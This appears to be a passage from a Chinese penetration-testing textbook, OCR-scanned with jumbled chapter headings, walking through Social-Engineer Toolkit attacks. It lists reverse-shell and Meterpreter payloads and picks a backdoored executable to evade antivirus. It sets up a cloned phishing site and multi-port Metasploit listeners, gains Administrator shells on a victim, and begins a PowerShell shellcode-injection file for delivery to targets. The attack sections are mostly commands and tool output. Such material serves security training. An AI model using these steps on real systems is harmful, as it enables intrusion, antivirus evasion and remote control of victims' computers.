### 恶意Java Applet网站准备部署
请指定要生成的攻击载荷：

---
## 第7章 权限提升

#### 7.1 攻击载荷选择
- **名称：**
- **描述：**

1. **Windows Shell Reverse TCP**  
   在受害者机器上启动命令行并回传给攻击者。

2. **Windows Reverse TCP Meterpreter**  
   在受害者机器上启动Meterpreter shell并回传给攻击者。

3. **Windows Reverse TCP VNC DLL**  
   在受害者机器上启动VNC服务器并回传给攻击者。

4. **Windows Bind Shell**  
   执行载荷并在远程系统上创建监听端口。

5. **Windows Bind Shell X64**  
   Windows x64 命令行，TCP绑定。

6. **Windows Shell Reverse TCP X64**  
   Windows x64 命令行，反向TCP连接。

7. **Windows Meterpreter Reverse TCP X64**  
   反向连接到攻击者（Windows x64），使用Meterpreter。

8. **Windows Meterpreter All Ports**  
   启动Meterpreter shell并找到一个可用端口（所有端口）。

9. **Windows Meterpreter Reverse HTTPS**  
   通过HTTPS隧道通信并使用Meterpreter。

10. **Windows Meterpreter Reverse DNS**  
    使用主机名而不是IP地址启动Meterpreter。

11. **SE Toolkit Interactive Shell**  
    自定义的交互式反向工具包，专为SET设计。

12. **SE Toolkit HTTP Reverse Shell**  
    纯原生HTTP shell，支持AES加密。

13. **RATTE HTTP Tunneling Payload**  
    安全绕过载荷，将所有通信通过HTTP隧道传输。

14. **ShellCodeExec Alphanum Shellcode**  
    通过shellcodeexec投放Meterpreter载荷。

15. **Pylnjector Shellcode Injection**  
    通过Pylnjector投放Meterpreter载荷。

16. **MultiPylnjector Shellcode Injection**  
    通过内存注入多个Metasploit载荷。

17. **Import your own executable**  
    指定路径导入自定义可执行文件。

```
set:payloads>
```

以上信息列出了可使用的攻击载荷。选择编号2，即`Windows Reverse TCP Meterpreter`，以建立反向TCP连接。
```
set:payloads>2
```

接下来，选择编码方式：
1. **shikata_ga_nai**
2. **No Encoding**
3. **Multi-Encoder**
4. **Backdoored Executable**

推荐选择“Backdoored Executable”来绕过基本的防病毒检测。
```
set:encoding>4
```

设置监听端口：
```
set:payloads> PORT of the listener [443]:
```

生成x86-based powershell注入代码：
```
[*] Generating x86-based powershell injection code for port: 22
[*] Generating x86-based powershell injection code for port: 53
[*] Generating x86-based powershell injection code for port: 443
[▪] Generating x86-based powershell injection code for port: 21
[] Generating x86-based powershell injection code for port: 25
[+] Finished generating powershell injection bypass.
[] Encoded to bypass execution restriction policy..
· 229 ·
```

---
## 第3篇 各种渗透测试

### 7.2 配置后门合法可执行文件
等待几秒钟，后门完成，载荷隐藏在合法可执行文件中。
```
[*] Backdoor completed successfully. Payload is now hidden within a legit executable.
[*] Apache appears to be running, moving files into Apache's home
************************************************
Web Server Launched. Welcome to the SET Web Attack.
***4**4**.**.**0**4****9*****4**9**.*********4***.
[--] Tested on Windows, Linux, and OSX [-]
[-] Apache web server is currently in use for performance. [--]
[] Moving payload into cloned website.
[*] The site has been moved. SET Web Server is now listening.
[-] Launching MSF Listener...
[-] This may take a few to load MSF...
```

在Metasploit Pro中配置监听器：
```
=[ metasploit v4.9.3-2014070201 [core:4.9 api:1.0] ]
-- --=[ 1315 exploits - 716 auxiliary - 209 post
+ -- --=[341 payloads - 35 encoders - 8 nops
+ -- --=[ Free Metasploit Pro trial: http:/r-7.co/trymsp ]
[*] Processing /root.set/meta_config for ERB directives.
resource (/root/.set/meta_config)> use exploit/multi/handler
resource (/root/.set/meta_config)> set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
resource (/root/.set/meta_config)> set LHOST 192.168.6.103
LHOST => 192.168.6.103
resource (/root/.set/meta_config)> set EnableStageEncoding false
EnableStageEncoding => false
resource (/root/.set/meta_config)> set ExitOnSession false
ExitOnSession =>false
resource (/root/.set/meta_config)> set LPORT 22
LPORT => 22
resource (/root/.set/meta_config)> exploit -j
[+] Exploit running as background job.
```

重复上述步骤，配置不同端口的监听器：
```
resource (/root/.set/meta_config)> set LPORT 53
LPORT => 53
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
resource (/root/.set/meta_config)> set LPORT 443
LPORT => 443
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
resource (/root/.set/meta_config)> set LPORT 21
LPORT => 21
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
resource (/root/.set/meta_config)> set LPORT 25
LPORT => 25
resource (/root/.set/meta_config)> exploit -j
[*] Exploit running as background job.
```

查看已创建的会话：
```
msf exploit(handler) > sessions
Active sessions
PI
Type
Information
Connection
**
1
meterpreter x86/win32
WIN-RKPKQFBLG6CVAdministrator @WIN-RKPKQFBLG6C
192.168.6.103:443 -> 192.168.6.106:50729 (192.168.6.106)
2
meterpreter x86/win32
WIN-RKPKQFBLG6C\Administrator@ WIN-RKPKQFBLG6C
192.168.6.103:21 -> 192.168.6.106:50728 (192.168.6.106)
3
meterpreter x86/win32
WIN-RKPKQFBLG6C\Administrator@WIN-RKPKQFBLG6C
192.168.6.103:22 -> 192.168.6.106:50727 (192.168.6.106)
4
meterpreter x86/win32
WIN-RKPKQFBLG6CIAdministrator@WIN-RKPKQFBLG6C
192.168.6.103:53 -> 192.168.6.106:50730 (192.168.6.106)
```

启动会话1并获取远程主机的命令行Shell：
```
msf exploit(handler) > sessions -i 1
[*] Starting interaction with 1..
meterpreter > shell
Process 5056 created.
Channel 1 created.
Microsoft Windows [版本 6.1.7601]
(c)20og Microsoft Corporation
C:\Users\Administrator\Desktop>
```

### 7.3 PowerShell攻击向量
在社会工程学攻击中，基于Java的PowerShell攻击向量非常重要。如果目标主机没有运行Java，则无法欺骗其访问攻击主机的社会工程页面。此时可以使用另一种方法，即向目标主机发送恶意文件。使用PowerShell攻击向量可以创建PowerShell文件，并将其发送给目标。当目标运行该文件时，可以获取一个远程连接。

#### 实例7-3：使用PowerShell攻击向量创建PowerShell文件并发送给目标主机

1. 启动社会工程学工具包：
```
Select from the menu:
1) Social-Engineering Attacks
2) Fast-Track Penetration Testing
3) Third Party Modules
4) Update the Metasploit Framework
5) Update the Social-Engineer Toolkit
6) Update SET configuration
7) Help, Credits, and About
99) Exit the Social-Engineer Toolkit
set>
```

2. 选择社会工程学攻击向量，输入编号1：
```
set> 1
Select from the menu:
1) Spear-Phishing Attack Vectors
2) Website Attack Vectors
3) Infectious Media Generator
4) Create a Payload and Listener
5) Mass Mailer Attack
6) Arduino-Based Attack Vector
7) SMS Spoofing Attack Vector
8) Wireless Access Point Attack Vector
9) QRCode Generator Attack Vector
10) Powershell Attack Vectors
11) Third Party Modules
99) Return back to the main menu.
set>
```

3. 选择PowerShell攻击向量，输入编号10：
```
set> 10
The Powershell Attack Vector module allows you to create PowerShell specific attacks. These
attacks will allow you to use PowerShell which is available by default in all operating systems
performing functions that do not get triggered by preventative technologies.
1) Powershell Alphanumeric Shellcode Injector
2) Powershell Reverse Shell
3) Powershell Bind Shell
4) Powershell Dump SAM Database
99) Return to Main Menu
set:powershell>
```

4. 选择PowerShell字母数字Shellcode注入，输入编号1：
```
set:powershell>1
set> IP address for the payload listener: 192.168.6.103
# 设置攻击主机的地址
set:powershell> Enter the port for the reverse [443]:
# 设置反向连接的端口号，这里使用默认端口号
[*] Prepping the payload for delivery and injecting alphanumeric shellcode...
[*] Generating x86-based powershell injection code...
[*] Finished generating powershell injection bypass.
[*] Encoded to bypass execution restriction policy..
[*] If you want the powershell commands and attack, they are exported to
/root/.set/reports/powershell/
set> Do you want to start the listener now [yes/no]: : yes
# 是否现在开始监听
Unable to handle kernel NULL pointer dereference at virtual address Oxd34db33f
EFLAGS: 00010046
eax:00000001 ebx:f77c8c00 ecx:00000000 edx:f77f0001
esi: 803bf014 edi: 8023c755 ebp: 80237f84 esp: 80237f60
ds: 0018 es:0018 ss:0018
Process Swapper (Pid: 0, process nr: 0, stackpage=80377000)
Stack: 90909090990909090990909090
90909090990909090990909090
90909090.90909090.90909090
90909090.90909090.90909090
90909090.90909090.09090900
90909090.90909090.09090900
CCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCCCCCCCCCCCCCCCCCCC
CCCCCCCCC.....
CCCCCCCCC
ffff..
ffff...
fff...
fffff..
Code: 00 00 00 00 M3 T4 SP L0 1T FR 4M 3W OR K! V3 R5 10 N4 00 00 00 00
Aiee, Killing Interrupt handler
Kernel panic: Attempted to kill the idle task!
In swapper task - not syncing
Payload caught by AV? Fly under the radar with Dynamic Payloads in
Metasploit Pro -- learn more on http://rapid7.com/metasploit
=[ metasploit v4.9.3-2014070201 [core:4.9 api:1.0]]
+ ----=[1315 exploits -716 auxiliary-209post
```